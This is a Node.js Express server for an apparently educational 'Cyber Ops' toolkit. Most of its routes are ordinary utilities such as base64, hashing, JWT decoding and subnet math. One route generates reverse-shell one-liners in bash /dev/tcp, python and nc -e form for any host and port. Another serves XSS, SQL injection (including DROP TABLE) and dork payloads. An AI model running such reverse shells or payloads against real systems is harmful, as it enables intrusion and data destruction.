// server.js
// Safe Backend for Cyber Ops tools (educational / simulated).

const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const multer = require('multer');
const crypto = require('crypto');
const fetch = require('node-fetch');

// ✅ 1. إضافة مكتبة المسارات (مهم جداً)
const path = require('path');

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

app.use(express.json());
app.use(cors({
    origin: '*'
}));

// ✅ 2. كود ربط ملفات الـ HTML والـ CSS بملف السيرفر
// السطر ده بيقول للسيرفر: "أي ملفات html أو صور، دور عليها جوه فولدر اسمه public"
app.use(express.static(path.join(__dirname, 'public')));

// ✅ 3. كود فتح الصفحة الرئيسية
// السطر ده بيقول: "لما حد يفتح الموقع، اعرض له index.html"
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// rate limiting to reduce abuse
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 150
});
app.use(limiter);

/* -------------------------
   Utility / helper routes
   ------------------------- */

// 1) Generate password
app.get('/api/password', (req, res) => {
    const length = parseInt(req.query.len) || 16;
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{};:,.<>?';
    let pass = '';
    for (let i = 0; i < length; i++) pass += chars[Math.floor(Math.random() * chars.length)];
    res.json({ password: pass });
});

// 2) Base64 encode/decode (handles UTF-8)
app.post('/api/base64/encode', (req, res) => {
    const txt = (req.body.text || '');
    const b64 = Buffer.from(txt, 'utf8').toString('base64');
    res.json({ base64: b64 });
});
app.post('/api/base64/decode', (req, res) => {
    const b64 = (req.body.base64 || '');
    try {
        const txt = Buffer.from(b64, 'base64').toString('utf8');
        res.json({ text: txt });
    } catch (e) {
        res.status(400).json({ error: 'invalid base64' });
    }
});

// 3) ROT13
app.post('/api/rot13', (req, res) => {
    const s = (req.body.text || '');
    const out = s.replace(/[A-Za-z]/g, c => {
        const base = c <= 'Z' ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
    });
    res.json({ result: out });
});

// 4) Binary encode (text -> space-separated bytes)
app.post('/api/binary', (req, res) => {
    const s = (req.body.text || '');
    const out = Array.from(Buffer.from(s, 'utf8')).map(b => b.toString(2).padStart(8, '0')).join(' ');
    res.json({ binary: out });
});

// 5) File hashing (SHA-256)
app.post('/api/hash-file', upload.single('file'), async(req, res) => {
    if (!req.file) return res.status(400).json({ error: 'no file uploaded' });
    const hash = crypto.createHash('sha256').update(req.file.buffer).digest('hex');
    res.json({ filename: req.file.originalname, sha256: hash });
});

// 6) JWT decode 
app.post('/api/jwt-decode', (req, res) => {
    const token = (req.body.token || '').trim();
    if (!token) return res.status(400).json({ error: 'no token provided' });
    const parts = token.split('.');
    if (parts.length < 2) return res.status(400).json({ error: 'invalid jwt' });
    try {
        const payload = Buffer.from(parts[1].replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
        try {
            return res.json({ payload: JSON.parse(payload) });
        } catch (e) {
            return res.json({ payload });
        }
    } catch (e) {
        return res.status(400).json({ error: 'invalid base64 in token' });
    }
});

// 7) Network calculator
app.post('/api/network-calc', (req, res) => {
    const ip = (req.body.ip || '').trim();
    const cidr = Number(req.body.cidr);
    if (!ip || isNaN(cidr) || cidr < 0 || cidr > 32) return res.status(400).json({ error: 'invalid input' });
    const parts = ip.split('.').map(p => Number(p));
    if (parts.length !== 4 || parts.some(p => isNaN(p) || p < 0 || p > 255)) return res.status(400).json({ error: 'invalid ip' });

    const ipNum = ((parts[0] << 24) >>> 0) + (parts[1] << 16) + (parts[2] << 8) + parts[3];
    const mask = cidr === 0 ? 0 : (~0 << (32 - cidr)) >>> 0;
    const net = (ipNum & mask) >>> 0;
    const netOctets = [(net >>> 24) & 255, (net >>> 16) & 255, (net >>> 8) & 255, net & 255];
    res.json({ network: netOctets.join('.') + '/' + cidr });
});

// 8) IP Geolocation 
app.get('/api/ip-geo/:ip', async(req, res) => {
    const ip = req.params.ip || '';
    if (!ip) return res.status(400).json({ error: 'no ip' });
    try {
        const resp = await fetch(`http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,isp,query`);
        const data = await resp.json();
        res.json({ source: 'ip-api.com', data });
    } catch (e) {
        res.status(500).json({ error: 'lookup failed' });
    }
});

// 9) Reverse-shell generator
app.post('/api/rev-shell/generate', (req, res) => {
    const lhost = (req.body.lhost || '').trim();
    const lport = (req.body.lport || '').trim();
    if (!lhost || !lport) return res.status(400).json({ error: 'lhost and lport required' });

    const examples = {
        bash: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
        python3: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'`,
        nc: `nc -e /bin/sh ${lhost} ${lport}`,
    };
    res.json({ notice: 'This returns example command strings only for educational use on machines you own.', examples });
});

// 10) Port probe simulator
const ALLOWED_HOSTS = ['127.0.0.1', 'localhost'];
const net = require('net');
app.post('/api/port-probe', (req, res) => {
    const host = (req.body.host || '').trim();
    const port = Number(req.body.port);
    if (!host || isNaN(port) || port <= 0 || port > 65535) return res.status(400).json({ error: 'invalid input' });
    if (!ALLOWED_HOSTS.includes(host)) return res.status(403).json({ error: 'host not allowed. Add to ALLOWED_HOSTS to permit.' });

    const socket = new net.Socket();
    let responded = false;
    socket.setTimeout(1500);
    socket.connect(port, host, () => {
        if (!responded) {
            responded = true;
            res.json({ host, port, open: true });
            socket.destroy();
        }
    });
    socket.on('timeout', () => {
        if (!responded) {
            responded = true;
            res.json({ host, port, open: false, reason: 'timeout' });
            socket.destroy();
        }
    });
    socket.on('error', (err) => {
        if (!responded) {
            responded = true;
            res.json({ host, port, open: false, reason: 'error', error: String(err) });
        }
    });
});

// 11) Simple generators
app.get('/api/payloads/xss', (req, res) => {
    res.json({
        samples: [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '\"><script>alert(1)</script>'
        ]
    });
});
app.get('/api/payloads/sqli', (req, res) => {
    res.json({
        samples: [
            "' OR 1=1 -- ",
            "'; DROP TABLE users; -- "
        ]
    });
});
app.get('/api/payloads/dorks', (req, res) => {
    res.json({
        samples: [
            'site:example.com filetype:pdf',
            'intitle:"index of" "backup"'
        ]
    });
});

// 12) Admin finder generator
app.get('/api/admin-paths', (req, res) => {
    const domain = (req.query.domain || '').replace(/^https?:\/\//, '').replace(/\/.*$/, '');
    if (!domain) return res.status(400).json({ error: 'domain query param required' });
    const paths = ['/admin', '/administrator', '/login', '/admin/login', '/wp-admin', '/cpanel'];
    res.json({ domain, candidates: paths.map(p => `https://${domain}${p}`) });
});

/* -----------------------------
   Start server
------------------------------*/
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});